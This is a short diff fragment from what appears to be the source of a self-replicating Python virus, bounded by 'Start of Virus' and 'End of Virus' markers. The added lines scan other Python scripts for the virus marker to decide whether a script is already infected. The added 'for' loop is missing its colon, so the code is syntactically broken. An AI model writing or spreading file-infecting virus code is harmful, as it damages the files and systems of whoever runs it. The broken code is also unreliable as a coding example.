@@ -25,4 +25,11 @@ for script in python_scripts:
     with open(script, 'r') as f: # 'r' = reading mode
         script_code =f.readlines()
 
+    # Assuming that the file is not infected.
+    infected = False
+    for line in script_code
+        if line == '### Start of Virus ###\n':
+            infected = True
+            break
+
 ### End of Virus ###
